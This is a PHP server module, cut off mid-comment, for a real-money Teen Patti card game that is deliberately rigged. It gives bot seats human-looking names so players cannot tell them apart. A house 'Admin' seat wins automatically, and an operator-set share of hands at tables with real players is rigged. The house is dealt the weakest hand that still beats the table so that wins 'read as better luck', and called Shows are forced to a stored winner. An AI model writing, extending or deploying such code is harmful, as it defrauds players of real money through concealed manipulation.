<?php
/**
 * Teen Patti — six-room, four-seat, real-time table game.
 *
 * =================================================================================================
 * FIVE TIMERS BECAME FIVE DEADLINES
 * =================================================================================================
 * server.js drove this game with setTimeout/setInterval:
 *
 *   filler turn scheduler   1.5-3.5s random   ->  TeenPattiRoom.bot_turn_due_at
 *   post-hand room reset    5s                ->  TeenPattiRoom.round_end_due_at
 *   bot fill after a join   15s               ->  TeenPattiRoom.bot_fill_due_at
 *   sweeper (turn timeout,
 *     stuck rooms, presence) every 5s         ->  tp_sweep(), run on every request + the cron
 *   organic traffic engine  6-12s random      ->  GameState `tp_traffic_next_at`, same treatment
 *
 * Each deadline is written down, and whichever request arrives after it has passed performs the
 * work. A room with a player in it advances promptly because the client polls every 2 seconds. An
 * EMPTY room has nothing polling it, which is what the one-minute cron is for: it runs exactly the
 * same sweep, so idle rooms still fill and still start. The only visible difference is that an
 * unwatched lobby fills in minute-granularity steps rather than every 6-12 seconds.
 * =================================================================================================
 */

require_once __DIR__ . '/../lib/db.php';
require_once __DIR__ . '/../lib/helpers.php';
require_once __DIR__ . '/../lib/botengine.php';
require_once __DIR__ . '/../lib/rigaudit.php';

const TP_TURN_TIMEOUT   = 15;     // seconds
const TP_BOT_FILL_DELAY = 15000;  // 15s before fillers occupy empty seats
const TP_BOT_THINK_MIN  = 1500;
const TP_BOT_THINK_MAX  = 3500;
const TP_ROUND_DELAY    = 5000;   // 5s between rounds

/**
 * Realistic filler names for empty-seat auto-fill — no seat is ever named or labelled "bot"
 * anywhere in the app. The only seat that ever wins on purpose is explicitly renamed to "Admin" at
 * the exact moment the takeover algorithm selects it (see tp_start_round); every other auto-filled
 * seat just gets a plain human-looking name.
 */
function tp_simulated_names() {
    return [
        'Aarav', 'Vivaan', 'Aditya', 'Vihaan', 'Arjun', 'Sai', 'Reyansh', 'Arav', 'Pranav', 'Krishna',
        'Ishaan', 'Shaurya', 'Atharv', 'Rohan', 'Rudra', 'Aryan', 'Dev', 'Karan', 'Dhruv', 'Siddharth',
        'Ananya', 'Diya', 'Ishika', 'Kiara', 'Myra', 'Aria', 'Saanvi', 'Riya', 'Prisha', 'Anika',
    ];
}

function random_filler_name() {
    $names = tp_simulated_names();
    return $names[(int) floor(js_random() * count($names))] . '_' . (10 + (int) floor(js_random() * 90));
}

/**
 * Called by every seat-fill path right before it occupies a seat with an ordinary filler.
 *
 * This used to also decide whether the seat being filled was "Admin" — rooms were pre-selected at
 * toggle time to reserve a random arrival position for the house's own seat, independent of the
 * per-round decision every other rig path draws from. That meant a room could win its "one
 * guaranteed Admin seat" from this mechanism ON TOP OF whatever the per-round engine produced
 * afterwards: two independent percentage mechanisms stacking instead of summing to the one
 * percentage the operator configured, which is exactly why 50% could show up as "8 of 10 games".
 * Every seat filled through here is now always an ordinary filler.
 */
function next_room_filler_username() {
    return ['username' => random_filler_name(), 'is_bot' => true];
}

// -------------------------------------------------------------------------------------------------
// Cards
// -------------------------------------------------------------------------------------------------

function tp_create_deck() {
    $suits = ['S', 'H', 'C', 'D'];
    $deck = [];
    for ($r = 2; $r <= 14; $r++) {
        foreach ($suits as $s) $deck[] = ['r' => $r, 's' => $s];
    }
    return js_shuffle($deck);
}

/** Suit key of a card, tolerating both the raw {r,s} and the formatted {r,suit} shapes. */
function tp_suit_of($card) {
    if (isset($card['s']) && $card['s'] !== null) return $card['s'];
    return $card['suit'] ?? null;
}

/**
 * Evaluate a three-card hand.
 * Returns [category, tiebreak[], bestSuit] where category is
 * 6 Trail, 5 Pure Sequence, 4 Sequence, 3 Colour, 2 Pair, 1 High Card.
 */
function tp_evaluate_hand($cards) {
    if (!is_array($cards) || count($cards) < 3) return [0, [0], 0];

    $ranks = [];
    foreach ($cards as $c) $ranks[] = (int)$c['r'];
    rsort($ranks);

    $suits = [];
    foreach ($cards as $c) $suits[] = tp_suit_of($c);

    $isColor = ($suits[0] === $suits[1] && $suits[1] === $suits[2]);

    $isSeq = false;
    $seqTiebreak = $ranks;
    if ($ranks[0] - $ranks[1] === 1 && $ranks[1] - $ranks[2] === 1) {
        $isSeq = true;
    } elseif ($ranks[0] === 14 && $ranks[1] === 3 && $ranks[2] === 2) {
        // A-3-2 is a sequence but the LOWEST one, hence the synthetic tiebreak.
        $isSeq = true;
        $seqTiebreak = [3, 2, 1];
    }

    $suitVals = ['S' => 4, 'H' => 3, 'C' => 2, 'D' => 1];
    $bestSuit = 0;
    foreach ($suits as $s) {
        $v = $suitVals[$s] ?? 0;
        if ($v > $bestSuit) $bestSuit = $v;
    }

    if ($ranks[0] === $ranks[1] && $ranks[1] === $ranks[2]) return [6, [$ranks[0]], $bestSuit];
    if ($isSeq && $isColor) return [5, $seqTiebreak, $bestSuit];
    if ($isSeq) return [4, $seqTiebreak, $bestSuit];
    if ($isColor) return [3, $ranks, $bestSuit];
    if ($ranks[0] === $ranks[1]) return [2, [$ranks[0], $ranks[2]], $bestSuit];
    if ($ranks[1] === $ranks[2]) return [2, [$ranks[1], $ranks[0]], $bestSuit];
    return [1, $ranks, $bestSuit];
}

/** Does hand $a beat hand $b? */
function tp_hand_wins($a, $b) {
    if ($a[0] !== $b[0]) return $a[0] > $b[0];
    for ($i = 0; $i < count($a[1]); $i++) {
        $av = $a[1][$i] ?? 0;
        $bv = $b[1][$i] ?? 0;
        if ($av !== $bv) return $av > $bv;
    }
    return $a[2] > $b[2];
}

/**
 * Find the closest believable winning hand — the one with the MINIMUM winning margin over the best
 * rival hand.
 *
 * This is what makes a rigged win read as better luck rather than an obviously stacked deck: the
 * house does not get a Trail every time, it gets whatever just barely beats the table.
 */
function tp_find_oblivious_winning_hand($deck, $rivalHand) {
    $bestCards = null;
    $bestEval = null;
    $n = count($deck);

    for ($i = 0; $i < $n - 2; $i++) {
        for ($j = $i + 1; $j < $n - 1; $j++) {
            for ($k = $j + 1; $k < $n; $k++) {
                $cards = [$deck[$i], $deck[$j], $deck[$k]];
                $ev = tp_evaluate_hand($cards);
                if (!tp_hand_wins($ev, $rivalHand)) continue;
                // Keep the WEAKEST hand that still wins.
                if ($bestEval === null || tp_hand_wins($bestEval, $ev)) {
                    $bestEval = $ev;
                    $bestCards = $cards;
                }
            }
        }
    }
    return ['cards' => $bestCards, 'evaluation' => $bestEval];
}

function tp_hand_label($cat) {
    $m = [6 => 'Trail', 5 => 'Pure Sequence', 4 => 'Sequence', 3 => 'Color', 2 => 'Pair', 1 => 'High Card'];
    return $m[$cat] ?? 'Unknown';
}

function tp_rank_label($r) {
    $m = [11 => 'J', 12 => 'Q', 13 => 'K', 14 => 'A'];
    return $m[(int)$r] ?? (string)(int)$r;
}

function tp_suit_symbol($s) {
    $m = ['S' => '♠', 'H' => '♥', 'C' => '♣', 'D' => '♦'];
    return $m[$s] ?? $s;
}

function tp_format_cards($cards) {
    if (!is_array($cards)) return null;
    $out = [];
    foreach ($cards as $c) {
        $suitKey = tp_suit_of($c);
        $out[] = [
            'label'  => tp_rank_label($c['r']),
            'suit'   => $suitKey,
            'symbol' => tp_suit_symbol($suitKey),
            'red'    => ($suitKey === 'H' || $suitKey === 'D'),
            'r'      => (int)$c['r'],
        ];
    }
    return $out;
}

// -------------------------------------------------------------------------------------------------
// Room access
// -------------------------------------------------------------------------------------------------

function tp_room_ids_list() { return tp_room_ids(); }

function tp_get_room($roomId) {
    return one('SELECT * FROM "TeenPattiRoom" WHERE "id" = ?', [$roomId]);
}

function tp_get_seats($roomId) {
    $rows = all('SELECT * FROM "TeenPattiSeat" WHERE "room_id" = ? ORDER BY "seat" ASC', [$roomId]);
    foreach ($rows as $i => $r) {
        $rows[$i]['seat']    = (int)$r['seat'];
        $rows[$i]['is_bot']  = ((int)$r['is_bot']) !== 0;
        $rows[$i]['folded']  = ((int)$r['folded']) !== 0;
        $rows[$i]['seen']    = ((int)$r['seen']) !== 0;
        $rows[$i]['balance'] = (float)$r['balance'];
        $rows[$i]['cards']   = $r['cards'] === null ? null : json_decode($r['cards'], true);
    }
    return $rows;
}

function tp_room_log($room) {
    $log = $room['log'] === null ? [] : json_decode($room['log'], true);
    return is_array($log) ? $log : [];
}

function tp_room_admin_rig($room) {
    if ($room['admin_rig'] === null) return null;
    $r = json_decode($room['admin_rig'], true);
    return is_array($r) ? $r : null;
}

function tp_update_room($roomId, array $fields) {
    if (!count($fields)) return;
    $sets = []; $params = [];
    foreach ($fields as $k => $v) { $sets[] = "\"$k\" = ?"; $params[] = $v; }
    $params[] = $roomId;
    q('UPDATE "TeenPattiRoom" SET ' . implode(', ', $sets) . ' WHERE "id" = ?', $params);
}

function tp_update_seat($seatId, array $fields) {
    if (!count($fields)) return;
    $sets = []; $params = [];
    foreach ($fields as $k => $v) { $sets[] = "\"$k\" = ?"; $params[] = $v; }
    $params[] = (int)$seatId;
    q('UPDATE "TeenPattiSeat" SET ' . implode(', ', $sets) . ' WHERE "id" = ?', $params);
}

function tp_clear_all_seats($roomId) {
    q('UPDATE "TeenPattiSeat" SET "username" = NULL, "is_bot" = 0, "cards" = NULL, "folded" = 0,
       "last_seen_at" = NULL WHERE "room_id" = ?', [$roomId]);
}

function tp_reset_room_to_waiting($roomId) {
    tp_clear_all_seats($roomId);
    tp_update_room($roomId, ['status' => 'waiting', 'pot' => 0, 'winner_seat' => null]);
}

/**
 * Vacate a stale "Admin" seat.
 *
 * Clearing admin_rig stops any FUTURE round being rigged, but does nothing about "Admin" already
 * sitting in a seat from before the toggle changed — tp_start_round's ADMIN AUTO-WIN check rigs for
 * a seated Admin unconditionally, "however it got seated", so a stale seat kept auto-winning every
 * hand indefinitely even after the operator turned the bot off.
 *
 * A hand already in progress is left alone: the cards are dealt and stakes are committed, so
 * evicting mid-hand would corrupt that round rather than fix anything. The post-round reset already
 * will not reseed Admin once the bot is off, so an in-flight hand self-corrects when it finishes.
 */
function tp_evict_stale_admin_seat($roomId) {
    try {
        $room = tp_get_room($roomId);
        if (!$room || $room['status'] === 'playing') return;
        $count = affected(
            "UPDATE \"TeenPattiSeat\" SET \"username\" = NULL, \"is_bot\" = 0, \"cards\" = NULL, \"folded\" = 0
             WHERE \"room_id\" = ? AND \"username\" = 'Admin'", [$roomId]);
        if ($count > 0) log_info('evicted stale Admin seat after bot takeover toggled off', ['roomId' => $roomId]);
    } catch (Throwable $e) {
        log_error("[TP] Error evicting stale Admin seat in {$roomId}: " . $e->getMessage());
    }
}

// -------------------------------------------------------------------------------------------------
// Filler decision-making
// -------------------------------------------------------------------------------------------------

function tp_bot_decide($cards, $stake) {
    $hand = tp_evaluate_hand($cards);
    $cat = $hand[0];
    $rand = js_random() * 100;
    if ($cat >= 5) return 'chaal';
    if ($cat === 4 && $rand <= 90) return 'chaal';
    if ($cat === 3 && $rand <= 70) return 'chaal';
    if ($cat === 2 && $rand <= 55) return 'chaal';
    if ($cat === 1 && $rand <= 25) return 'chaal';
    return 'fold';
}

function tp_next_active_seat($seats, $currentTurnSeat) {
    $nums = [];
    foreach ($seats as $s) {
        if (!empty($s['username']) && empty($s['folded'])) $nums[] = (int)$s['seat'];
    }
    sort($nums);
    if (count($nums) === 0) return null;
    $idx = array_search($currentTurnSeat, $nums, true);
    if ($idx === false) $idx = -1;
    return $nums[($idx + 1) % count($nums)];
}

/** Schedule a filler/Admin turn 1.5-3.5s from now. */
function tp_schedule_bot_turn($roomId) {
    $delay = TP_BOT_THINK_MIN + (int) floor(js_random() * (TP_BOT_THINK_MAX - TP_BOT_THINK_MIN));
    tp_update_room($roomId, ['bot_turn_due_at' => now_ms() + $delay]);
}

/** Schedule the 15s fill-and-deal, unless one is already pending. */
function tp_schedule_bot_fill($roomId) {
    if (!cfg('TEENPATTI_AUTO_BOT_FILL')) return; // real-players-only mode — never pad a table
    $room = tp_get_room($roomId);
    if (!$room) return;
    if ($room['bot_fill_due_at'] !== null) return;   // already scheduled
    tp_update_room($roomId, ['bot_fill_due_at' => now_ms() + TP_BOT_FILL_DELAY]);
}

// -------------------------------------------------------------------------------------------------
// Round lifecycle
// -------------------------------------------------------------------------------------------------

/** Deal a fresh hand. */
function tp_start_round($roomId) {
    $room = tp_get_room($roomId);
    if (!$room) return;
    $seats = tp_get_seats($roomId);

    $occupiedSeats = array_values(array_filter($seats, function ($s) { return !empty($s['username']); }));
    if (count($occupiedSeats) < 2) return;   // need at least 2 players

    $bootAmt = (float)$room['boot_amount'];

    // Verify all real players can cover the boot; eject anyone who cannot.
    foreach ($occupiedSeats as $idx => $seat) {
        if (empty($seat['is_bot']) && !empty($seat['username'])) {
            if (strtolower($seat['username']) === 'admin') {
                $adminUser = one('SELECT * FROM "User" WHERE "username" = ? LIMIT 1', ['Admin']);
                if ($adminUser) {
                    q('UPDATE "User" SET "wallet_balance" = ? WHERE "id" = ?', [5000.0, (int)$adminUser['id']]);
                }
            }
            $user = find_user_ci($seat['username']);
            if (!$user || (float)$user['wallet_balance'] < $bootAmt) {
                tp_update_seat($seat['id'], ['username' => null, 'is_bot' => 0, 'cards' => null, 'folded' => 0]);
                $occupiedSeats[$idx]['username'] = null;   // mark as empty in memory
            }
        }
    }

    $activeOccupied = array_values(array_filter($occupiedSeats, function ($s) { return !empty($s['username']); }));
    if (count($activeOccupied) < 2) {
        // Not enough players left, cancel round and reset room to waiting.
        tp_reset_room_to_waiting($roomId);
        return;
    }

    $deck = tp_create_deck();
    $deckPos = 0;
    $pot = 0.0;

    foreach ($activeOccupied as $seat) {
        $cards = [$deck[$deckPos++], $deck[$deckPos++], $deck[$deckPos++]];
        $pot += $bootAmt;

        if (empty($seat['is_bot']) && !empty($seat['username'])) {
            try {
                q('UPDATE "User" SET "wallet_balance" = "wallet_balance" - ? WHERE LOWER("username") = LOWER(?)',
                  [$bootAmt, $seat['username']]);
                insert_transaction(
                    new_record_id('TP'), $seat['username'], 'Withdrawal', $bootAmt,
                    'Teen Patti Boot — ' . $room['name'] . ' Round #' . ((int)$room['round'] + 1),
                    'Completed'
                );
            } catch (Throwable $e) { log_error('[TP] Boot deduct error: ' . $e->getMessage()); }
        }

        tp_update_seat($seat['id'], [
            'cards'   => js_json_encode($cards),
            'folded'  => 0,
            // Fillers have effectively infinite funds; for humans this tracks the round delta.
            'balance' => !empty($seat['is_bot']) ? 5000.0 : ($bootAmt * -1),
            'seen'    => !empty($seat['is_bot']) ? 1 : 0,
        ]);
    }

    // ---- Decide whether this hand is rigged -----------------------------------------------------
    $rigSeat = null;
    $rigReason = '';

    $adminSeatEntry = null;
    foreach ($activeOccupied as $s) {
        if (!empty($s['username']) && empty($s['is_bot']) && strtolower($s['username']) === 'admin') { $adminSeatEntry = $s; break; }
    }

    $existingRig = tp_room_admin_rig($room);

    if ($adminSeatEntry) {
        // The house's own account always wins whenever it is seated — independent of the manual rig
        // config, the bot on/off state, or live targeting. It still uses the same closest-believable
        // winning-hand construction as every other rig path, so it reads as better luck rather than
        // an obviously stacked deck every single time.
        $rigSeat = (int)$adminSeatEntry['seat'];
        $rigReason = 'ADMIN AUTO-WIN';
        try {
            tp_update_room($roomId, ['admin_rig' => js_json_encode(['winner_seat' => $rigSeat, 'is_admin_autowin' => true])]);
        } catch (Throwable $e) { log_error('[TP] Error persisting admin auto-win rig: ' . $e->getMessage()); }
    } elseif ($existingRig !== null && array_key_exists('winner_seat', $existingRig)) {
        $rigSeat = (int)$existingRig['winner_seat'];
        $rigReason = 'MANUAL ADMIN RIG';
    } else {
        // Every table draws from its OWN exact 100-slot ledger, the same way each colour room does.
        //
        // The previous approach picked a live subset of TABLES and rigged whichever hands those
        // tables dealt. That satisfied "50% of live tables are the house's" at any instant but
        // produced the wrong experience: the selection was sticky, so the first table to go live
        // captured the slot and never released it, and with uneven table activity the share of HANDS
        // rigged bore no relation to the configured figure. Measured with 23 players across six
        // tables at 50%: one table took the entire share while every other got nothing, for 11% of
        // hands overall. A per-table ledger satisfies both readings at once.
        //
        // Only tables with a real person on them draw at all: rigging a table occupied purely by
        // NPCs moves no money and would burn slots that belong to real hands.
        $bot = bot_takeover_active('teenpatti');

        $hasRealPlayer = false;
        foreach ($activeOccupied as $s) {
            if (!empty($s['username']) && empty($s['is_bot']) && strtolower($s['username']) !== 'admin') { $hasRealPlayer = true; break; }
        }
        if ($hasRealPlayer) mark_instance_active('teenpatti', $roomId);

        $tableDecision = $hasRealPlayer
            ? should_bot_rig_this_round('teenpatti', 'teenpatti:' . $roomId)
            : ['shouldRig' => false, 'profit_pct' => $bot['profit_pct'], 'active' => $bot['active']];

        if ($tableDecision['shouldRig']) {
            $botSeat = null;
            foreach ($activeOccupied as $s) { if (!empty($s['is_bot'])) { $botSeat = $s; break; } }
            $targetSeat = $botSeat;

            if ($targetSeat === null) {
                // No filler bot is sitting at this table (production runs with none by design — see
                // TEENPATTI_AUTO_BOT_FILL) — the only honest way for the house to take a cut is to
                // occupy a seat itself, staking a real boot like anyone else. Falling back to a REAL
                // player's own seat here moves no money at all: it just relabels which already-seated
                // player wins their own shared pot back, silently zeroing out the house edge on any
                // table that fills with real players. If there's nowhere left to sit, this hand is
                // simply left unrigged below — the house never staked anything in it.
                $activeSeatNumbers = array_map(function ($s) { return (int)$s['seat']; }, $activeOccupied);
                $emptySeat = null;
                foreach ($seats as $s) {
                    if (!in_array((int)$s['seat'], $activeSeatNumbers, true)) { $emptySeat = $s; break; }
                }
                if ($emptySeat !== null) {
                    try {
                        $adminUser = get_or_create_user('Admin');
                        if ($adminUser) {
                            q('UPDATE "User" SET "wallet_balance" = ? WHERE "id" = ?', [5000.0, (int)$adminUser['id']]);
                        }
                        $cards = [$deck[$deckPos++], $deck[$deckPos++], $deck[$deckPos++]];
                        tp_update_seat($emptySeat['id'], [
                            'username' => 'Admin', 'is_bot' => 0, 'cards' => js_json_encode($cards),
                            'folded' => 0, 'balance' => $bootAmt * -1, 'seen' => 0,
                        ]);
                        q('UPDATE "User" SET "wallet_balance" = "wallet_balance" - ? WHERE "username" = ?', [$bootAmt, 'Admin']);
                        insert_transaction(
                            new_record_id('TP'), 'Admin', 'Withdrawal', $bootAmt,
                            'Teen Patti Boot — ' . $room['name'] . ' Round #' . ((int)$room['round'] + 1),
                            'Completed'
                        );
                        $pot += $bootAmt;
                        $emptySeat['username'] = 'Admin';
                        $emptySeat['is_bot'] = 0;
                        $occupiedSeats[] = $emptySeat; // keep firstSeat's candidate list consistent, below
                        $targetSeat = $emptySeat;
                    } catch (Throwable $e) { log_error('[TP] Error seating Admin for bot-takeover rig: ' . $e->getMessage()); }
                }
            }

            if ($targetSeat) {
                $rigSeat = (int)$targetSeat['seat'];
                $rigReason = "AI BOT TAKEOVER (" . js_num_str($bot['profit_pct']) . "% OF THIS TABLE'S HANDS)";
                // Whenever the algorithm's own pick is a genuine filler seat — never a real
                // connected human it fell back to — rename it to "Admin" for this hand.
                if ($botSeat !== null) {
                    try {
                        tp_update_seat($botSeat['id'], ['username' => 'Admin', 'is_bot' => 0]);
                    } catch (Throwable $e) { log_error('[TP] Error renaming targeted seat to Admin: ' . $e->getMessage()); }
                }
                try {
                    tp_update_room($roomId, ['admin_rig' => js_json_encode([
                        'winner_seat' => $rigSeat, 'is_bot_rig' => true, 'profit_pct' => $bot['profit_pct'],
                    ])]);
                } catch (Throwable $e) { log_error('[TP] Error persisting bot rig: ' . $e->getMessage()); }
            }
        }
    }

    // Audit only — one entry per hand, tagged with the room so the per-table split is visible.
    $eligible = false;
    foreach ($activeOccupied as $s) {
        if (!empty($s['username']) && empty($s['is_bot']) && strtolower($s['username']) !== 'admin') { $eligible = true; break; }
    }
    rig_record([
        'game'           => 'teenpatti',
        'instance'       => $roomId,
        'round'          => (int)$room['round'] + 1,
        'configured_pct' => bot_takeover_active('teenpatti')['profit_pct'],
        'rigged'         => $rigSeat !== null,
        // A hand between NPCs never draws from the table's ledger, so it is recorded for visibility
        // but excluded from the ratio — counting it would understate how often real hands are rigged.
        'eligible'       => $eligible,
        // Reported for context only: each table decides from its own ledger, so this is not the
        // decision's denominator.
        'live'           => count(get_live_instances('teenpatti')),
        'note'           => $rigReason !== '' ? $rigReason : 'fair hand',
    ]);

    // ---- Apply the rig: construct the closest believable winning hand ---------------------------
    if ($rigSeat !== null) {
        $freshSeats = tp_get_seats($roomId);
        $activeSeats = array_values(array_filter($freshSeats, function ($s) { return !empty($s['username']) && !empty($s['cards']); }));
        if (count($activeSeats) >= 2) {
            $rivalSeats = array_values(array_filter($activeSeats, function ($s) use ($rigSeat) { return (int)$s['seat'] !== $rigSeat; }));
            if (count($rivalSeats) > 0) {
                $bestRivalSeat = $rivalSeats[0];
                for ($i = 1; $i < count($rivalSeats); $i++) {
                    if (tp_hand_wins(tp_evaluate_hand($rivalSeats[$i]['cards']), tp_evaluate_hand($bestRivalSeat['cards']))) {
                        $bestRivalSeat = $rivalSeats[$i];
                    }
                }
                $rivalBestHand = tp_evaluate_hand($bestRivalSeat['cards']);

                $rigTarget = null;
                foreach ($activeSeats as $s) { if ((int)$s['seat'] === $rigSeat) { $rigTarget = $s; break; } }

                if ($rigTarget) {
                    $usedCardKeys = [];
                    foreach ($rivalSeats as $s) {
                        if (!empty($s['cards'])) {
                            foreach ($s['cards'] as $c) $usedCardKeys[$c['r'] . '_' . tp_suit_of($c)] = true;
                        }
                    }
                    $fullDeck = tp_create_deck();
                    $remainingDeck = array_values(array_filter($fullDeck, function ($c) use ($usedCardKeys) {
                        return !isset($usedCardKeys[$c['r'] . '_' . $c['s']]);
                    }));
                    $oblivious = tp_find_oblivious_winning_hand($remainingDeck, $rivalBestHand);

                    if ($oblivious && $oblivious['cards']) {
                        tp_update_seat($rigTarget['id'], ['cards' => js_json_encode(tp_format_cards($oblivious['cards']))]);
                    } else {
                        // Fallback swap: give the target the best rival's hand and vice versa.
                        $tempCards = $rigTarget['cards'];
                        tp_update_seat($rigTarget['id'],     ['cards' => js_json_encode($bestRivalSeat['cards'])]);
                        tp_update_seat($bestRivalSeat['id'], ['cards' => js_json_encode($tempCards)]);
                    }
                }
            }
        }
    }

    // NOTE: firstSeat is taken from occupiedSeats, which still contains any seat vacated for
    // insufficient balance above. So the first turn can land on a now-empty seat. That is the
    // original behaviour and is reproduced; the turn-timeout sweep moves play on if it happens.
    $sorted = $occupiedSeats;
    usort($sorted, function ($a, $b) { return $a['seat'] - $b['seat']; });
    $firstSeat = (int)$sorted[0]['seat'];

    tp_update_room($roomId, [
        'status'        => 'playing',
        'pot'           => $pot,
        'current_stake' => $bootAmt,
        'turn_seat'     => $firstSeat,
        'turn_index'    => 0,
        'turn_start'    => ms_to_sql(),
        'winner_seat'   => null,
        'round'         => (int)$room['round'] + 1,
        'deck_state'    => js_json_encode(array_slice($deck, $deckPos, 10)),
        'log'           => js_json_encode(['Round #' . ((int)$room['round'] + 1) . ' started! Boot: ₹' . js_num_str($bootAmt) . '. Pot: ₹' . js_num_str($pot)]),
        'bot_fill_due_at'  => null,
        'round_end_due_at' => null,
    ]);

    // If the first seat is a filler (or Admin), schedule its move.
    $firstPlayer = null;
    foreach ($occupiedSeats as $s) { if ((int)$s['seat'] === $firstSeat) { $firstPlayer = $s; break; } }
    // The original dereferenced `firstPlayer.username.toLowerCase()` here, which throws when the
    // first seat is one that was just vacated. Guarded rather than reproduced, because a crash is
    // not a behaviour anything depends on; the observable outcome (no bot turn scheduled for an
    // empty seat) is what the sweep then handles.
    if ($firstPlayer && (!empty($firstPlayer['is_bot']) ||
        (!empty($firstPlayer['username']) && strtolower($firstPlayer['username']) === 'admin'))) {
        tp_schedule_bot_turn($roomId);
    }
}

/** Process one player (or filler) action. Returns the same result objects the original returned. */
function tp_process_action($roomId, $username, $action) {
    $room = tp_get_room($roomId);
    if (!$room || $room['status'] !== 'playing') return ['error' => 'Game not active.'];
    $seats = tp_get_seats($roomId);

    $mySeat = null;
    foreach ($seats as $s) {
        if (!empty($s['username']) && strtolower($s['username']) === strtolower((string)$username)) { $mySeat = $s; break; }
    }
    if (!$mySeat) return ['error' => 'You are not in this room.'];
    if (!empty($mySeat['folded'])) return ['error' => 'You already folded.'];
    if ((int)$room['turn_seat'] !== (int)$mySeat['seat']) return ['error' => 'Not your turn.'];

    $activeSeats = array_values(array_filter($seats, function ($s) { return !empty($s['username']) && empty($s['folded']); }));
    $log = tp_room_log($room);
    $currentStake = (float)$room['current_stake'];

    if ($action === 'chaal') {
        if (empty($mySeat['is_bot'])) {
            $user = find_user_ci($username);
            if (!$user || (float)$user['wallet_balance'] < $currentStake) {
                return ['error' => 'Insufficient balance for Chaal.'];
            }
            q('UPDATE "User" SET "wallet_balance" = "wallet_balance" - ? WHERE "id" = ?', [$currentStake, (int)$user['id']]);
            insert_transaction(new_record_id('TP_CHAAL'), $username, 'Withdrawal', $currentStake,
                'Teen Patti Chaal — ' . $room['name'], 'Completed');
        }

        $newPot = (float)$room['pot'] + $currentStake;
        $log[] = $mySeat['username'] . ' played Chaal (₹' . js_num_str($currentStake) . ')';

        $nextSeat = tp_next_active_seat($activeSeats, (int)$mySeat['seat']);

        tp_update_room($roomId, [
            'pot'        => $newPot,
            'turn_seat'  => $nextSeat,
            'turn_start' => ms_to_sql(),
            'log'        => js_json_encode(array_slice($log, -15)),
        ]);

        $nextPlayer = null;
        foreach ($seats as $s) { if ((int)$s['seat'] === (int)$nextSeat) { $nextPlayer = $s; break; } }
        if ($nextPlayer && empty($nextPlayer['folded']) &&
            (!empty($nextPlayer['is_bot']) || (!empty($nextPlayer['username']) && strtolower($nextPlayer['username']) === 'admin'))) {
            tp_schedule_bot_turn($roomId);
        }
        return ['success' => true];
    }

    if ($action === 'fold') {
        tp_update_seat($mySeat['id'], ['folded' => 1]);
        $log[] = $mySeat['username'] . ' packed.';

        $remainingActive = array_values(array_filter($activeSeats, function ($s) use ($mySeat) { return (int)$s['seat'] !== (int)$mySeat['seat']; }));
        if (count($remainingActive) === 1) {
            return tp_end_game($roomId, $remainingActive[0], (float)$room['pot'] + 0, $log, false);
        }

        // Recalculate the next turn from the seats still in the hand.
        $seatNums = [];
        foreach ($remainingActive as $s) $seatNums[] = (int)$s['seat'];
        sort($seatNums);
        $curIdx = array_search((int)$mySeat['seat'], $seatNums, true);
        if ($curIdx === false) {
            $nextActiveSeat = null;
            foreach ($seatNums as $n) { if ($n > (int)$mySeat['seat']) { $nextActiveSeat = $n; break; } }
            if ($nextActiveSeat === null) $nextActiveSeat = $seatNums[0];
        } else {
            $nextActiveSeat = $seatNums[($curIdx + 1) % count($seatNums)];
        }

        tp_update_room($roomId, [
            'turn_seat'  => $nextActiveSeat,
            'turn_start' => ms_to_sql(),
            'log'        => js_json_encode(array_slice($log, -15)),
        ]);

        $nextPlayerAfterFold = null;
        foreach ($seats as $s) { if ((int)$s['seat'] === (int)$nextActiveSeat) { $nextPlayerAfterFold = $s; break; } }
        if ($nextPlayerAfterFold && empty($nextPlayerAfterFold['folded']) &&
            (!empty($nextPlayerAfterFold['is_bot']) || (!empty($nextPlayerAfterFold['username']) && strtolower($nextPlayerAfterFold['username']) === 'admin'))) {
            tp_schedule_bot_turn($roomId);
        }
        return ['success' => true];
    }

    if ($action === 'show') {
        if (count($activeSeats) !== 2) return ['error' => 'Show only when 2 players remain.'];

        if (empty($mySeat['is_bot'])) {
            $user = find_user_ci($username);
            if (!$user || (float)$user['wallet_balance'] < $currentStake) {
                return ['error' => 'Insufficient balance for Show.'];
            }
            // Note: no ledger row is written for a Show stake. That is the original behaviour.
            q('UPDATE "User" SET "wallet_balance" = "wallet_balance" - ? WHERE "id" = ?', [$currentStake, (int)$user['id']]);
        }

        $newPot = (float)$room['pot'] + $currentStake;
        $opponent = null;
        foreach ($activeSeats as $s) { if ((int)$s['seat'] !== (int)$mySeat['seat']) { $opponent = $s; break; } }

        $winner = null;
        $rig = tp_room_admin_rig($room);
        if ($rig !== null && array_key_exists('winner_seat', $rig)) {
            foreach ($activeSeats as $s) { if ((int)$s['seat'] === (int)$rig['winner_seat']) { $winner = $s; break; } }
        }
        if (!$winner) {
            $myHand = tp_evaluate_hand($mySeat['cards']);
            $oppHand = tp_evaluate_hand($opponent['cards']);
            $winner = tp_hand_wins($myHand, $oppHand) ? $mySeat : $opponent;
        }

        $log[] = $mySeat['username'] . ' called Show!';
        return tp_end_game($roomId, $winner, $newPot, $log, true);
    }

    return ['error' => 'Unknown action.'];
}

/** Credit the winner and close the hand. */
function tp_end_game($roomId, $winnerSeat, $pot, $log, $wasShow) {
    $winnerName = $winnerSeat['username'];
    if ($wasShow) $log[] = $winnerName . ' won the Show! Pot: ₹' . js_num_str($pot);
    else          $log[] = 'Everyone folded. ' . $winnerName . ' wins! Pot: ₹' . js_num_str($pot);

    if (empty($winnerSeat['is_bot']) && $winnerName) {
        try {
            q('UPDATE "User" SET "wallet_balance" = "wallet_balance" + ? WHERE LOWER("username") = LOWER(?)', [$pot, $winnerName]);
            insert_transaction(new_record_id('TP_WIN'), $winnerName, 'Deposit', $pot, 'Teen Patti Won Pot', 'Completed');
        } catch (Throwable $e) { log_error('[TP] Winner credit error: ' . $e->getMessage()); }
    }

    $log[] = '🏆 GAME OVER — ' . $winnerName . ' WON THE POT OF ₹' . js_num_str($pot) . '!';

    tp_update_room($roomId, [
        'status'           => 'finished',
        'winner_seat'      => (int)$winnerSeat['seat'],
        'pot'              => $pot,
        'log'              => js_json_encode(array_slice($log, -15)),
        // Replaces the 5-second setTimeout that emptied the room.
        'round_end_due_at' => now_ms() + TP_ROUND_DELAY,
    ]);

    return ['success' => true, 'winner' => $winnerName];
}

/** The work the post-hand setTimeout used to do, once its deadline has passed. */
function tp_finish_round_reset($roomId) {
    try {
        tp_clear_all_seats($roomId);
        tp_update_room($roomId, ['status' => 'waiting', 'pot' => 0, 'winner_seat' => null, 'round_end_due_at' => null]);

        // Pre-seed a seat so the table looks populated. This is a cosmetic room-filling heuristic
